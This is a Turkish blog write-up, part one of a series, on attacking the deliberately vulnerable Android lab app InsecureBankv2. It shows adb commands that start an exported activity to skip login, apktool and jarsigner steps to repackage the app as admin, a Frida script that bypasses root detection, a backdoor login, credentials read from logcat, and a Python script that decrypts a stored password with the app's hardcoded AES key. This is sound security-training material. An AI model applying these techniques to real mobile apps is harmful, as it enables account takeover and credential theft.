---
layout: post
title:  "InsecureBankv2 Writeup - Part 1"
author: "Alp Eren Işık"
date:   2020-10-21
categories: [writeup, mobile-security]
permalink: /:year/:month/:day/:title:output_ext
---

# Insecure Bank v2 Writeup - Part 1
-------------------------------------

`InsecureBankv2` isimli uygulamamız zafiyetli bir android uygulaması. Bu uygulamayı kurarken iki aşamamız olacak. Öncelikle `https://github.com/dineshshetty/Android-InsecureBankv2` adresinden zafiyetli uygulamamızı `git clone` ile bilgisayarımıza çekmemiz lazım. Daha sonra içerisinde bulunan `AndroLabServer` isimli klasörün içerisine girerek `pip install -r requirements.txt` komutunu çalıştırıyor ve gerekli kütüphaneleri indiriyoruz. (Bu ufak server python2 ile yazılmış eğer python3-pip veya pip3 vs ile denerseniz muhtemelen çalışmayacaktır). Server tarafında gerekli kurulumu yaptıktan sonra `python app.py` diyerek çalıştıralım. Default olarak 8888 portunu dinlemekte. Tek yapmamız gereken bir de IP adresimizin ne olduğunu öğrenmek olacak.

Server tarafını hallettikten sonra gene aynı github adresinde bulunan `InsecureBankv2.apk` dosyasını `adb install InsecureBankv2.apk` ile cihazımıza yükleyelim

![0](/static/img/posts/insecurebankv2/part1/0.png)

Uygulamamızı açtıktan sonra `Preferences` kısmında kurmuş olduğumuz serverın IP adresini girelim ve kayıt edelim.

![1](/static/img/posts/insecurebankv2/part1/1.png)

Evet herşey hazır gibi şimdi anasayfaya gelebiliriz.

![2](/static/img/posts/insecurebankv2/part1/2.png)

Bizi bir `login` sayfası karşıladı. Öncelikle rastgele bir giriş işlemi deneyelim daha sonra bize `github` reposunda söylemiş olduğu kullanıcılardan birini kullanalım.

```bash
$ python app.py
The server is hosted on port: 8888
u= None
{"message": "User Does not Exist", "user": "kullaniciadideneme"}
u= <User u'jack'>
{"message": "Correct Credentials", "user": "jack"}
```

![3](/static/img/posts/insecurebankv2/part1/3.png)

Evet giriş yaptık ancak cihazın rootlandığına dair bir mesaj var. Şimdilik bir önemi var mı bilmiyoruz ama nasıl atlatabileceğimize bakacağız tabi ki :)

Ama önce düşünmemiz gereken başka birşey var bence. Bu zafiyetli uygulamayı hazırlayanlar bize hali hazırda kayıtlı olan kullanıcıların username/password bilgisini vermeseydi buraya nasıl girecektik ? 🤔

# `Vulnerable Activity Components`

`AndroidManifest.xml` dosyamızın içerisine bakacak olursak eğer...

```java
<activity android:label="@string/app_name" android:name="com.android.insecurebankv2.LoginActivity">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
</activity>
```

`LoginActivity`'nin bizim giriş işleminin yapıldığı yer olduğunu düşünebiliriz. Emin olmak için yakından bakalım.

![4](/static/img/posts/insecurebankv2/part1/4.png)

Burda bakacağımız başka şeylerde var :joy: ama şimdilik amacımızın dışına çıkmadan devam edelim. Gördüğünüz üzere `performLogin()` isimli bir fonksiyon çağrılmış.

```java
/* access modifiers changed from: protected */
public void performlogin() {
    this.Username_Text = (EditText) findViewById(R.id.loginscreen_username);
    this.Password_Text = (EditText) findViewById(R.id.loginscreen_password);
    Intent i = new Intent(this, DoLogin.class);
    i.putExtra("passed_username", this.Username_Text.getText().toString());
    i.putExtra("passed_password", this.Password_Text.getText().toString());
    startActivity(i);
}
```

Bu fonksiyonu incelediğimiz zaman ise `DoLogin` isimli başka bir yapıyı kullandığını görüyoruz.

Eğer `DoLogin` isimli class a gidersek dikkatimizi şu satır çekecektir.

```java
if (DoLogin.this.result.indexOf("Correct Credentials") != -1) {
    Log.d("Successful Login:", ", account=" + DoLogin.this.username + ":" + DoLogin.this.password);
    saveCreds(DoLogin.this.username, DoLogin.this.password);
    trackUserLogins();
    Intent pL = new Intent(DoLogin.this.getApplicationContext(), PostLogin.class);
    pL.putExtra("uname", DoLogin.this.username);
    DoLogin.this.startActivity(pL);
    return;
}
```

Başarılı bir şekilde giriş yaptıktan sonra serverda yazmış olduğu log mesajını görüyoruz. Başarılı giriş yaptıktan sonra ise `PostLogin` isimli başka bir class a yönlendiriyor ki bu da bizim giriş yaptıktan sonra gördüğümüz ekran.

```bash
adb shell am start -n com.android.insecurebankv2/com.android.insecurebankv2.PostLogin
```

![5](/static/img/posts/insecurebankv2/part1/5.png)

`NOT`: https://developer.android.com/guide/topics/manifest/receiver-element.html#exported

```java
...
<activity android:label="@string/title_activity_post_login" android:name="com.android.insecurebankv2.PostLogin" android:exported="true"/>
...
```

# `Application Patching`

`LoginActivity` isimli class da

```java
...
if (getResources().getString(R.string.is_admin).equals("no")) {
    findViewById(R.id.button_CreateUser).setVisibility(8);
}
...
```

Şöyle bir kontrol gerçekleştirilmekte. Eğer `is_admin` değişkeni `no` ise o zaman `setVisibility(8)` ile `CreateUser` butonu gizleniyormuş. O halde biz bu değişkeni `yes` yaparsak gizlenmiş olan bu buton ortaya çıkacaktır.

```bash
    $ apktool d InsecureBankv2.apk
    $ nano InsecureBankv2/res/values/strings.xml
```

```java
...
<string name="is_admin">no</string>
...
```

Değiştirip `yes` yapıyoruz. Daha sonra değiştirmiş olduğumuz zafiyetli programımızı yeniden paketlememiz ve imzalamamız gerekecek. O da hızlıca şu şekilde oluyormuş...

```bash
    $ apktool b InsecureBankv2 -o InsecureBankv2_edited.apk
    $ keytool -genkey -v -keystore ctf.keystore -alias ctfKeystore -keyalg RSA -keysize 2048 -validity 10000
    $ jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore ctf.keystore InsecureBankv2_edited.apk ctfKeystore
    $ jarsigner -verify -verbose -certs InsecureBankv2_edited.apk
    $ adb uninstall com.android.insecurebankv2
    $ adb install InsecureBankv2_edited.apk
```    

Uygulamamızı paketledik imzaladık. Eskisini sildik ve yeni halini yükledik. Sıra geldi çalıştırmaya

![6](/static/img/posts/insecurebankv2/part1/6.png)

# `Root Detection and Bypass`

Hatırlayacağınız üzere login olduktan sonra bize kullandığımız cihazın root'lu olup olmadığına dair bir mesaj veriyordu. Eee bizim cihazımızda rootlu olduğu için haliyle bunu nasıl atlatabiliriz diye düşünmemiz lazım ki ilerde başımıza bela olmasın.

Öncelikle cihazın rootlandığını nasıl anlıyor ona bir bakalım

![7](/static/img/posts/insecurebankv2/part1/7.png)

`showRootStatus` isimli fonksiyonumuz bu mesajı gösteriyormuş. Bu mesajı gösterip göstermiyeceğine karar vermek içinde iki tane fonksiyondan yaralanıyormuş. Eğer bir tanesi bile `true` dönerse cihaz rootlu diyor. Buraya kadar herşey gayet anlaşılır. Bu iki fonksiyonda sistem içerisinde belirli dosyaları arıyor gibi görünüyor. Eğer varsa `true` döndürüyor ki bu da bizim `showRootStatus` fonksiyonumuzun `Rooted Device!!` yazmasına sebep oluyordu.

Bu kısımda `doesSUexist` ve `doesSuperuserApkExist` isimli fonksiyonlarımızı `frida` aracılığı ile manipüle ederek `false` döndürmelerini sağlayacağız.

https://frida.re/docs/installation/

https://frida.re/docs/android/

Ufak bir `js` kodu işimizi görecektir.

```js
Java.perform(function(){
	console.log("Insecure Bank v2 Root Detection and Bypass");
	var my_bank = Java.use("com.android.insecurebankv2.PostLogin");

	my_bank.doesSUexist.implementation = function(){
		console.log("SU root check bypass");
		return false;
	};
	my_bank.doesSuperuserApkExist.implementation = function(){
		console.log("Superuser.apk check bypass");
		return false;
	};
});
```

Oldukça sade ve anlaşılır bir kod parçası. Uygulamamızın ilgili class'ını bir değişkene atıyoruz ve manipüle etmek istediğimiz fonksiyonları tek tek belirterek ne yaptırmak istediğimizi yazıyoruz... Konsola bir mesaj bassın ve `false` değeri döndürsün

![8](/static/img/posts/insecurebankv2/part1/8.png)

    frida -l root-detection-bypass.js -U -f com.android.insecurebankv2 --no-pause

# `Developer Backdoors`

`DoLogin` class ımızın içerisinde dikkatimizi çeken bir yer daha var

![9](/static/img/posts/insecurebankv2/part1/9.png)

```java
...
HttpPost httppost = new HttpPost(DoLogin.this.protocol + DoLogin.this.serverip + ":" + DoLogin.this.serverport + "/login");
HttpPost httppost2 = new HttpPost(DoLogin.this.protocol + DoLogin.this.serverip + ":" + DoLogin.this.serverport + "/devlogin");
...
if (DoLogin.this.username.equals("devadmin")) {
    httppost2.setEntity(new UrlEncodedFormEntity(nameValuePairs));
    responseBody = httpclient.execute(httppost2);
} else {
    httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
    responseBody = httpclient.execute(httppost);
}
...
```

Eğer dikkat edecek olursanız kullanıcı adı `devadmin` ise başka herhangi bir kontrol yapmadan `/devlogin`'e gidiyor. Eğer kullanıcı adı başka birşey ise o zaman `/login`'e gidiyor. O halde kullanıcı adını `devadmin` parolayıda rastgele birşeyler girerek `/devlogin`'den giriş yapabiliriz.

![10](/static/img/posts/insecurebankv2/part1/10.png)

```bash
...
{"message": "Correct Credentials", "user": "devadmin"}
...
```

# `Insecure Logging mechanism`

Kullanıcı başarılı bir şekilde giriş yaptığında `kullanıcı adı ve parolasını` loglara yazıyor...

```bash
$ adb logcat | grep "jack"
10-20 19:11:51.348  1828  1844 D Successful Login:: , account=jack:Jack@123$
```

![11](/static/img/posts/insecurebankv2/part1/11.png)

# `Insecure SDCard storage`

![12](/static/img/posts/insecurebankv2/part1/12.png)

`mySharedPreferences` isimli bir dosyanın içerisinde kullanıcı bilgilerin tutulduğunu görüyoruz.

![14](/static/img/posts/insecurebankv2/part1/14.png)

`Username` base64 ile encode ediliyor ancak `password` `aesEncryptedString` fonksiyonu ile encode edilmiş.

![15](/static/img/posts/insecurebankv2/part1/15.png)

Evet sıra geldi `password`'u decode etmeye. Bunun için öncelikle `CryptoClass` içerisinde bulunan `aesEncryptedString` fonksiyonuna bakalım.

![16](/static/img/posts/insecurebankv2/part1/16.png)

Encrypt ve decrypt fonksiyonlarını incelersek az çok nasıl çözeceğimizi anlayabiliriz. Bunun için ufak bir python scripti işimizi görecektir.

```python
# https://pypi.org/project/pycrypto/
from Crypto.Cipher import AES
import base64

key = b"This is the super secret key 123"
ivBytes = b"\x00"*16
password = base64.b64decode("v/sJpihDCo2ckDmLW5Uwiw==")

aes = AES.new(key, AES.MODE_CBC, ivBytes)
decrypted_password = aes.decrypt(password)

print(decrypted_password)
```

![17](/static/img/posts/insecurebankv2/part1/17.png)


#### `KAYNAK`

    https://medium.com/bugbountywriteup/android-insecurebankv2-walkthrough-part-1-9e0788ba5552
    https://medium.com/bugbountywriteup/android-insecurebankv2-walkthrough-part-2-429b4ab4a60f
    https://medium.com/bugbountywriteup/android-insecurebankv2-walkthrough-part-3-2b3e5843fe91
